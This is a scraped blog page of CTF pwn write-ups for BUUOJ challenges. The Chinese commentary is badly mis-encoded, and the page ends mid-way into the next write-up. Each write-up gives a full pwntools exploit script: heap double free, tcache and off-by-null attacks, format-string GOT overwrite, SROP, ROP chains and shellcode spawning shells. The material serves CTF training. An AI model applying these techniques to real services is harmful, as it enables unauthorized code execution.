edit(10,p64(mmap) + '\\n') add(0x200) # debug() itr() é¢˜è®°è¿™ä¸ªé¢˜è¿˜æœ‰ä¸€ç§åŠæ³•æ”»å‡»mmapå°±æ˜¯ç”¨unlinkæ¥è¿›è¡Œï¼Œå› ä¸ºé¢˜ç›®å°±ç»™äº†&amp;heap ï¼Œé¢˜ç›®é¢„æœŸè§£å°±æ˜¯è¿™æ ·ã€‚ å¦å¤–ä¸€ç§è§£æ³•ï¼Œå°±æ˜¯æ”»å‡»stdoutï¼Œæ³„æ¼libcåœ°å€ï¼Œç„¶åæ”»å‡»malloc hookã€‚ ciscn_2019_sw_1åˆ†æ32ä½ï¼Œå•æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨ã€‚æ— æ³•ä¸€æ¬¡æ€§çš„è·å¾—shellã€‚è‡³å°‘è¿è¡Œ2æ¬¡ã€‚ æ”»å‡»__do_global_dtors_aux_fini_array_entryï¼Œè®©å…¶å†æ¬¡è¿è¡Œä¸€æ¬¡ï¼Œä¸”åŒæ—¶æ”¹ printf got çš„å€¼ä¸ºsystem pltã€‚ç„¶åé€ä¸€ä¸ª /bin/sh\\x00å³å¯ã€‚ expoffset = 4 payload = fmtstr_payload(offset,&#123;0x804979C:0x8048534,elf.got['printf']:elf.plt['system']&#125;,write_size = \"short\",numbwritten = 0) s(payload) sleep(1) sa('name','/bin/sh\\x00') itr() å› ä¸ºæ˜¯32ä½ï¼Œç”¨fmtstr_payloadæ˜¯å¾ˆå¥½ç”¨çš„ã€‚ lctf2016_pwn200åˆ†æ å¼€å¤´ä¸è¾“å…¥\\nï¼Œ48å­—ç¬¦å¯ä»¥æ³„éœ²å‡ºstackåœ°å€ æœ‰ç¬¬ä¸€æ®µå¯æ§çš„æ ˆï¼Œä¸”å¯ä»¥è¦†ç›–åˆ°heap ptr int sub_400A29() &#123; char buf; // [rsp+0h] [rbp-40h] char *dest; // [rsp+38h] [rbp-8h] dest = (char *)malloc(0x40uLL); puts(\"give me money~\"); read(0, &amp;buf, 0x40uLL); strcpy(dest, &amp;buf); ptr = dest; return sub_4009C4(); &#125; ä¸€æ¬¡åªèƒ½ç”³è¯·ä¸€ä¸ªå †ï¼Œå¤§å°0-0x80,ä¸”å…ˆé‡Šæ”¾æ‰èƒ½å†æ¬¡ç”³è¯·ã€‚ ä¿æŠ¤æƒ…å†µï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œæ‰€ä»¥å¯ä»¥å†™shellcodeï¼Œjmp ä¸Šå»å³å¯ã€‚ æ”»å‡»æ€è·¯ åˆ©ç”¨å¯æ§çš„æ ˆï¼Œhos åœ¨æ ˆä¸Šfake ä¸€ä¸ªå †ï¼Œä¿è¯å¯ä»¥æ”¹åˆ°ret address ç”³è¯·åŒå¤§å°çš„å †ï¼Œæ”¹ret address jmp åˆ° shellcode exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './pwn200' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26670) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('long',str(size)) sa('me',str(data)) def free(): sla('choice','2') shellcode = asm(shellcraft.sh()) sa('u',shellcode) ru('\\x05') leak_stack = uu64(r(6)) info_addr('leak_stack',leak_stack) shellcode_addr = leak_stack - 0x50 # debug() sla('id','65') payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90) sa('money',payload) free() payload = p64(0)*3 + p64(shellcode_addr) add(0x38,payload) sleep(0.2) sla('choice','3') # debug() itr() vn_pwn_babybabypwnåˆ†æ å¼€äº†æ²™ç›’ä¿æŠ¤ï¼Œåªèƒ½orw å¼€å§‹ç»™äº†libcåœ°å€ ç¨‹åºä¸»è¦æ‰§è¡Œäº†rt_sigreturnï¼Œè‚¯å®šæ˜¯å¥”ç€sropå»çš„ éš¾ç‚¹ orwçš„ropåº”è¯¥å¾€å“ªé‡Œå†™ï¼Œæ ˆåœ°å€æ˜¯ä¸çŸ¥é“çš„ å¯ä»¥åœ¨libcä¸Šæ‰¾ä¸€æ®µæ— ç”¨çš„åœ°æ–¹è¿›è¡Œå†™å³å¯ã€‚æ¯”å¦‚ libcçš„bssï¼Œfree hookæ®µã€‚ æœ‰çš„gadget ä½¿ç”¨ropgadgetæ‰¾ä¸åˆ° libc.search(asm(\"syscall \\nret\")).next() å¯ä»¥é€šè¿‡æœºå™¨ç æ¥æ‰¾ã€‚ srop ä¸­frameæ‰§è¡Œçš„é¡ºåº frame.rip æ˜¯å…ˆæ‰§è¡Œçš„åœ°å€ã€‚è€Œ frame.rsp çš„å€¼å°±æ˜¯æˆ‘ä»¬æ‰§è¡Œå®Œ frame.rip åï¼Œè¦æ‰§è¡Œçš„å€¼ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './vn_pwn_babybabypwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25535) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ' line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0d 0xc000003e if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009 if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029 if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031 if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032 if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038 if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039 if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0015: 0x06 0x00 0x00 0x00000000 return KILL ' ru('0x') libc_base = int(r(12),16) - libc.sym['puts'] info_addr('libc_base',libc_base) free_hook = 0x3c67a8 + libc_base read = libc.sym['read'] + libc_base puts = libc.sym['puts'] + libc_base open = libc.sym['open'] + libc_base pop_rdi= 0x0000000000021102 + libc_base pop_rsi = 0x00000000000202e8 + libc_base pop_rdx = 0x0000000000001b92 + libc_base syscall_ret = libc.search(asm(\"syscall \\nret\")).next() + libc_base # syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; frame = SigreturnFrame() frame.rax = 0 frame.rdi = 0 frame.rsi = free_hook frame.rdx = 0x300 frame.rip = syscall_ret frame.rsp = free_hook payload = str(frame)[8:] #å‰8å­—èŠ‚æ˜¯rt_sigreturn å…¶å¹¶ä¸éœ€è¦ä¼ªé€ ã€‚ç¨‹åºæ˜¯ä¸»åŠ¨è°ƒç”¨çš„ sigreturn # print(hex(len(frame))) s(payload) orw = flat([ pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read, pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open, pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read, pop_rdi,free_hook,puts ]) s(orw) sleep(0.2) s('./flag') # debug() itr() é¢˜è®°payload = str(frame)[8:] å¯¹äºä¸ºä»€ä¹ˆè¦ä»8å­—èŠ‚å¼€å§‹çš„ç†è§£ï¼Ÿ å‰8å­—èŠ‚æ˜¯rt_sigreturn,å…¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿ åœ¨ç¬¬äºŒæ­¥çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šå¸®ç”¨æˆ·è¿›ç¨‹å°†å…¶ä¸Šä¸‹æ–‡ä¿å­˜åœ¨è¯¥è¿›ç¨‹çš„æ ˆä¸Šï¼Œç„¶ååœ¨æ ˆé¡¶å¡«ä¸Šä¸€ä¸ªåœ°å€rt_sigreturnï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘ä¸€æ®µä»£ç ï¼Œåœ¨è¿™æ®µä»£ç ä¸­ä¼šè°ƒç”¨sigreturnç³»ç»Ÿè°ƒç”¨ã€‚å› æ­¤ï¼Œå½“signal handleræ‰§è¡Œå®Œä¹‹åï¼Œæ ˆæŒ‡é’ˆï¼ˆstack pointerï¼‰å°±æŒ‡å‘rt_sigreturnï¼Œæ‰€ä»¥ï¼Œsignal handlerå‡½æ•°çš„æœ€åä¸€æ¡retæŒ‡ä»¤ä¼šä½¿å¾—æ‰§è¡Œæµè·³è½¬åˆ°è¿™æ®µsigreturnä»£ç ï¼Œè¢«åŠ¨åœ°è¿›è¡Œsigreturnç³»ç»Ÿè°ƒç”¨,æŠŠåŸæ¥ä¿å­˜çš„å¯„å­˜å™¨ä¿¡æ¯å¼¹å›å»ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚ ç”±æ­¤å¯ä»¥å¾—å‡ºï¼Œå› ä¸ºç¨‹åºæ˜¯ä¸»åŠ¨è°ƒç”¨sigreturnçš„ï¼Œå¹¶ä¸éœ€è¦rt_sigreturnæŒ‡å‘ä¸€æ®µä»£ç ï¼Œå†è°ƒç”¨sigreturnç³»ç»Ÿè°ƒç”¨ã€‚ ciscn_2019_final_4è¿™ä¸ªé¢˜è¿˜æ˜¯å¾ˆå¥½çš„é¢˜ç›®ï¼Œè€ƒå¯Ÿäº†å¾ˆå¤šçš„åŸºç¡€çŸ¥è¯†ç‚¹ã€‚ åˆ†æ å¼€å¯äº†æ²™ç›’ç¦ç”¨execve å¼€å¤´è®©ä½ è¾“å…¥nameï¼Œæœ‰ä¸€æ®µå¯æ§çš„æ ˆç©ºé—´ï¼Œä¸”è¾ƒå¤§ pieä¿æŠ¤æ²¡æœ‰å¼€ å­˜åœ¨åè°ƒè¯•ï¼Œä½¿ç”¨ptraceåšçš„ï¼Œç›´æ¥gdb attachè¿‡å»ä¼šè¿›å…¥å­ç¨‹åºï¼Œçœ‹ä¸åˆ°å †æƒ…å†µ(ç›´æ¥åœ¨fork æ±‡ç¼–å¤„ï¼Œæ”¹æ±‡ç¼–ï¼Œjmp åˆ°ç¨‹åºè¾“å‡ºå­—ç¬¦ä¸²çš„åœ°æ–¹å³å¯ ) watchå‡½æ•°ä¸­ä¹Ÿç”¨ptraceï¼Œç›‘è§†äº†openï¼Œmmapï¼Œforkï¼Œvforkï¼Œptrace while ( 1 ) &#123; ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL); waitpid(a1, &amp;stat_loc, 0); if ( !(stat_loc &amp; 0x7F) || (char)((char)((stat_loc &amp; 0x7F) + 1) &gt;&gt; 1) &gt; 0 || (stat_loc &amp; 0xFF00) &gt;&gt; 8 != 5 ) break; ptrace(PTRACE_GETREGS, a1, 0LL, &amp;v3); v2 = v4; if ( v4 == 2 || v2 == 9 || v2 == 0x39 || v2 == 0x3A || v2 == 0x65 ) &#123; puts(\"hey! what are you doing?\"); exit(-1); &#125; &#125; è¿™é‡Œå¯ä»¥ç›‘è§†ä¸€ä¸‹execveï¼Œå¥½åƒå°±å¯ä»¥ä¸ç”¨å¼€æ²™ç®±äº†ã€‚ æ¼æ´ç‚¹å­˜åœ¨uaf éš¾ç‚¹orwçš„rop chainå¾€å“ªé‡Œè¯»ç¨‹åºè‡ªèº«æ˜¯å­˜åœ¨è¾ƒå°‘çš„gadgetsçš„ï¼Œæƒ³ç›´æ¥å®Œæˆorw çš„rop chainï¼Œæ˜¯ä¸å¯èƒ½çš„ã€‚ä¸Šæ¥å› ä¸ºæ²¡å¼€pieï¼Œèƒ½ç®€å•çš„å®Œæˆä¸€ä¸ªreadåŠŸèƒ½ã€‚åœ¨æ³„æ¼libcä»¥åï¼Œå°±æœ‰æ›´å¤§çš„å‘æŒ¥ç©ºé—´äº†ã€‚ å¼€å¤´nameæœ‰ä¸€å¤§å—å¯æ§åœ°å€ï¼Œè¯¥æ€ä¹ˆä½¿ç”¨ä¸Šã€‚å…ˆè¾“å…¥ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œç•™ç€å¯»æ‰¾ã€‚ sa('name','chumen77'*10) åœ¨æ§åˆ¶malloc hookåï¼Œéšæ„å†™ä¸ªåœ°å€ï¼Œè®©å…¶crashåœ¨è¿™é‡Œï¼ŒæŸ¥çœ‹ä¸‹æ ˆåœ°å€ï¼š data = 3 * '\\x00' + p64(0xdeadbeef) add(0x68,data) å‘ç°æ–­åœ¨0xdeadbeefï¼Œæ ˆä¸Šå¯ä»¥çœ‹åˆ°è¾“å…¥çš„nameæƒ…å†µã€‚ æ­¤å¤„æ¥ä¸€ä¸ªæ ˆåŠ«æŒï¼Œå¢åŠ rsp æŒ‡é’ˆ0x38 ï¼Œæ¥ç€retä¸Šå»ï¼Œå°±å¯ä»¥æ‰§è¡Œnameä¸Šçš„ä¸œè¥¿ï¼Œè¿™ä¸ªä¸œè¥¿è‚¯å®šå†™æˆä»…èƒ½å®Œæˆçš„read rop chainã€‚ å› ä¸ºpieæ²¡å¼€ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–°çš„read åœ¨bssæ®µä¸Šè¯»å–ä¸€ä¸ªæ–°çš„rop chainï¼Œæ¥ç€ret ä¸Šå»æ‰§è¡Œã€‚æ–°çš„rop chainï¼Œå¯ä»¥ä¸ºmprotectè§£å¼€bssæ®µçš„æ‰§è¡Œæƒé™ï¼Œæ¥ç€è·³ä¸Šorw flagçš„shellcodeå³å¯ã€‚ï¼ˆmprotect éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼ŒæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚ è¿™é‡Œç›´æ¥è®¾ç½®ä¸ºbssèµ·å§‹åœ°å€å³å¯ã€‚ï¼‰ openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠå¯ä»¥ä½¿ç”¨openatè¿›è¡Œä»£æ›¿ã€‚ #include &lt;fcntl.h&gt; int open(const char *path, int oflag, mode_t mode); int openat(int fd, const char *path, int oflag, mode_t mode ); //å‡½æ•°æ‰§è¡ŒæˆåŠŸè¿”å›æ–‡ä»¶æè¿°ç¬¦ï¼Œå¤±è´¥è¿”å›-1. https://blog.csdn.net/liangzc1124/article/details/83475246 https://www.cnblogs.com/BinBinStory/p/7400993.html å…¶ä¸­é‡ç‚¹å°±æ˜¯ï¼Œå½“openatçš„pathå‚æ•°ï¼Œè¾“å…¥æ˜¯ç»å¯¹åœ°å€æ—¶ï¼Œfdå°±ä¼šè¢«æ— è§†ï¼Œå…¶å‡½æ•°å°±ç›¸å½“äºopenäº†ã€‚æ‰€ä»¥æ­¤å¤„çš„fdï¼Œä¹Ÿæ˜¯å¯ä»¥è®¾æˆä»»æ„å€¼ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './ciscn_final_4' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25080) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('&gt;&gt;','1') sla('size',str(size)) sa('tent',str(data)) def free(idx): sla('&gt;&gt;','2') sla('index',str(idx)) def show(idx): sla('&gt;&gt;','3') sla('index',str(idx)) bss = 0x6021C0 pop_rdi = 0x0000000000401193 pop_rsi_r15 = 0x0000000000401191 pop_rsp_r13_r14_r15 = 0x000000000040118d orw = flat([pop_rdi,0,pop_rsi_r15,bss + 0x400,0,elf.plt['read'],pop_rsp_r13_r14_r15,bss + 0x400,0,0,0]) sa('name',str(orw)) # sa('name','chumen77'*10) add(0x1000,'1') add(0x10,'2') free(0) show(0) r() libcbase = uu64(r(6)) - 0x3c4b78 info_addr('libcbase',libcbase) add(0x68,'3') add(0x68,'4') add(0x68,'5') free(2) free(3) free(2) malloc_hook = 0x3c4afd + libcbase add(0x68,p64(malloc_hook)) add(0x68,'7') add(0x68,'8') rsp_add_0x38 = libc.search(asm(\"add rsp , 0x38\\nret\")).next() data = 3 * '\\x00' + p64(rsp_add_0x38 + libcbase) # data = 3 * '\\x00' + p64(0xdeadbeef) add(0x68,data) # debug() sla('&gt;&gt;','1') sla('size','20') sleep(0.2) pop_rdx = libcbase + libc.search(asm(\"pop rdx\\nret\")).next() pop_rsp = libcbase + libc.search(asm(\"pop rsp\\nret\")).next() mprotect = libcbase + libc.sym['mprotect'] payload = flat([pop_rdi,0x00602000,pop_rsi_r15,0x1000,0,pop_rdx,7,mprotect,0x602628]) shellcode = shellcraft.linux.openat(0,'/flag',0) + shellcraft.linux.read(3,bss+0x200,0x30) + shellcraft.linux.write(1,bss+0x200,0x30) sleep(0.2) s(p64(0)*3 + payload + p64(0) + asm(shellcode)) # debug() itr() å»¶ä¼¸åšæ³•https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/ å…¶æ˜¯ç”¨house_of_orange+setcontext+0x35è°ƒç”¨readä¼ å…¥ropchainæ¥å®Œæˆæ”»å‡»ã€‚ å¦‚æœæ— æ³•æ§åˆ¶free_hookä¸”åœ¨libc-2.23æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠæ³•ã€‚ sctf_2019_one_heapåˆ†æ ä¸å¯æŒ‡å®šidxï¼Œæ¥æ“ä½œchunkï¼Œåªèƒ½æ“ä½œå½“å‰malloc åˆ†é…chunkå¯¹åº”çš„heapåœ°å€ åªæœ‰free å’Œ addï¼Œfreeå¯ä»¥4æ¬¡ï¼Œaddå¯ä»¥0xfæ¬¡ éš¾ç‚¹ æ— showå‡½æ•° æœ‰é™çš„freeæ¬¡æ•°ï¼Œåªèƒ½é€šè¿‡åˆé€‚çš„å †æŠ€å·§æˆ–è€…çˆ†ç ´æ¥å®Œæˆæ”»å‡» æ­¤é¢˜ç”±äºåªèƒ½4æ¬¡freeï¼Œå…¶ä¸­3æ¬¡freeè¿˜æ˜¯ç›´æ¥å¿…é¡»æ‰§è¡Œçš„ï¼Œåªå‰©ä¸‹çš„ä¸€æ¬¡å°±å°¤ä¸ºå…³é”®ã€‚ç›®æ ‡å°±æ˜¯åœ¨å…¶freeä»¥åï¼Œæœ‰åŠæ³•è®©å†æ¬¡ç”³è¯·çš„chunkå¯ä»¥ä¿®æ”¹åˆ°è¿™ä¸ªfree chunkå¯¹åº”tcache binçš„fdï¼Œæ¥è¿›è¡Œtcache attackã€‚ å½“ä¸€ä¸ªå †AåŒæ—¶åœ¨tcacheé‡Œé¢ï¼Œåˆåœ¨unsortbiné‡Œé¢ï¼Œè¿™ç§æƒ…å†µæ˜¯å¸¸è§çš„ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å±é™©çš„ã€‚ å½“å…ˆç”³è¯·ä¸€ä¸ªå°çš„chunk Cï¼Œå…¶è‚¯å®šæ˜¯åœ¨æ­¤chunkä¸ŠæŒ‰ç…§unsortbinçš„è§„åˆ™ï¼Œåˆ†å‰²ä¸€ä¸‹ï¼Œç•™ä¸‹ä¸€ä¸ªå°çš„unsortbin binã€‚ ç„¶åæ¥ç€ç”³è¯·ä¸€ä¸ªç›¸åŒäºchunk Aå¤§å°çš„å †ï¼Œå°±æœ‰æœºä¼šæ”¹åˆ°è¿™ä¸ª2ä¸ªè¢«åˆ†å‰²å®Œçš„å°chunkã€‚æ¯”å¦‚æ”¹0x61çš„unsortbinçš„ä¿¡æ¯ï¼Œå¯ä»¥æ”¹å…¶sizeï¼Œå¹¶ä¸”æå‰åœ¨chunk Bå¤„ä¼ªé€ å¥½æ•°æ®ï¼Œå³å¯å®Œæˆä¸€ä¸ªfake çš„ unsortbinã€‚ å€˜è‹¥å†ç”³è¯·ä¸€ä¸ªåˆé€‚çš„å¤§å°ï¼Œæ¯”å¦‚0x68ï¼Œå³å¯æ”¹åˆ°chunk Bçš„æ•°æ®ã€‚æ­¤é¢˜ä¹Ÿå°±æ˜¯æ”¹å…¶fdæŒ‡é’ˆï¼Œå³å¯æ¥ç€å®Œæˆtcache attackã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './sctf_2019_one_heap' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] roc = [0x2,0x4,0x6,0xB,0xC,0xD] arae16 = 0x3c4b78 arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('ice','1') sla('size',str(size)) sa('tent',str(data)) def free(): sla('ice','2') def leak_addr(): add(0x7f,'chumen77' + '\\n') free() free() add(0x7f,'\\n') add(0x7f,'\\n') #å¤¹åœ¨top chunkå‰é¢ï¼Œé˜²æ­¢è¿›å…¥unsortbinæ—¶ç›´æ¥åˆå¹¶ã€‚å¹¶ä¸”fakeä¸€äº›æ•°æ®ï¼Œç•™ç€ç»•è¿‡åé¢çš„æ£€æŸ¥ã€‚ add(0x30,p64(0)*4+p64(0x90) + p64(0x20)) free() add(0x7f,'\\n') free() add(0x28,p16(0x9750) + '\\n') debug() # ä¿®æ”¹å‰©ä¸‹0x60å¤§å°çš„unsortbinçš„å¤§å°ä¸º0x90ï¼Œä¸”å‰é¢å·²ç»æœ‰fakeçš„æ•°æ®ï¼Œä¸ä¼šè®©ç¨‹åºcrush add(0x7f,p64(0)*5 + p64(0x91) +'\\n') payload = p64(0)*2 + p64(0xfbad3c80) + p64(0) * 3 + '\\x00' add(0x7f,payload + '\\n') leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(16) leak = u64(io.recv(8)) if leak == 0x320a6464412e310a: raise Exception('') break except Exception: io.close() io = process('./sctf_2019_one_heap') # io = remote('node3.buuoj.cn',28690) continue leak = leak &gt;&gt; 16 info_addr('leak',leak) libc_base = leak - 4110208 info_addr('libc_base',libc_base) malloc_hook = 0x3ebc30 + libc_base payload = p64(0) * 11 + p64(0x41) + p64(malloc_hook-8) debug() # ä¿®æ”¹0x40 tcache binçš„chain add(0x68,payload) debug() add(0x38,'\\n') realloc=libc_base+libc.symbols['realloc'] + roc[1] one = 0x10a38c + libc_base payload = p64(one) + p64(realloc) add(0x38,payload + '\\n') add(0x20,'\\n') # debug() itr() ciscn_2019_es_4åˆ†æåˆ©ç”¨off by nullï¼Œæ„é€ chunk overlappingï¼Œç„¶åtcache attackå³å¯ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './ciscn_2019_es_4' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26094) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sl('1') sla('dex',str(idx)) sla('size',str(size)) sa('tent',str(data)) sleep(0.1) def free(idx): sl('2') sla('dex',str(idx)) sleep(0.1) def show(idx): sl('4') sla('dex',str(idx)) sleep(0.1) def edit(idx,data): sl('3') sla('dex',str(idx)) sa('tent',str(data)) sleep(0.1) add(0,0x80,'\\n') add(1,0x98,'\\n') add(2,0xa8,'\\n') add(3,0xf0,'\\n') for i in range(7): add(i+4,0x80,'\\n') for i in range(7): free(i+4) add(i+4,0xf0,'\\n') for i in range(7): free(i+4) free(0) edit(2,'\\x00'*0xa0+p64(0x1e0)) free(3) free(1) add(3,0xa0,'\\x00'*0x80+p64(0x90)+p64(0xa0)+p64(0x00000000006022B0)) add(4,0x98,'\\n') add(5,0x98,p64(0xdeadbeefdeadbeef)*2) add(6,0x98,'\\n') show(6) r() libcbase = uu64(r(6)) - 0x3ebc0a info_addr('libcbase',libcbase) free(6) free(2) add(7,0x98,p64(0)*15+p64(0xb1)+p64(0x3ed8e8+libcbase)) add(8,0xa0,'\\n') add(9,0xa0,p64(libcbase+rce18[1])) free(8) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp","slug":"ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp","date":"2020-09-24T00:09:06.574Z","updated":"2020-09-26T12:18:50.233Z","comments":true,"path":"2020/09/24/ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp/","link":"","permalink":"http://chumen77.xyz/2020/09/24/ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp/","excerpt":"","text":"ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wpç¬¬ä¸€å¤©è·Ÿ6çº§å†²çªäº†ï¼ŒåŸºæœ¬æ²¡ç©ï¼Œç¬¬äºŒå¤©åšå®Œä¸€ä¸ªé¢˜idaç‚¸äº†ï¼Œæ€ä¹ˆä¹Ÿæ‰“ä¸å¼€ã€‚æœ€è¿‘ï¼Œæ€»æ˜¯å…³é”®æ—¶åˆ»æ‰é“¾å­äº†ğŸ˜­ã€‚ logic_mistakeåˆ†æ å¯ä»¥ç”³è¯·16ä¸ªå †ï¼Œsizeä¿¡æ¯æ”¾åœ¨å…¶chunkåœ°å€çš„ä¸‹8ä¸ªå­—èŠ‚ é€šè¿‡strdupæ¥è¿›è¡Œç”³è¯·å †ï¼Œ strdup ç›¸å½“äºs = input() malloc(stren(s)) editå‡½æ•° read(0, *((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]); è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„strdup å°±é€ æˆäº†å †æº¢å‡ºã€‚ æ”»å‡»æ€è·¯ ç”³è¯·8ä¸ª0x90å¤§å°çš„å 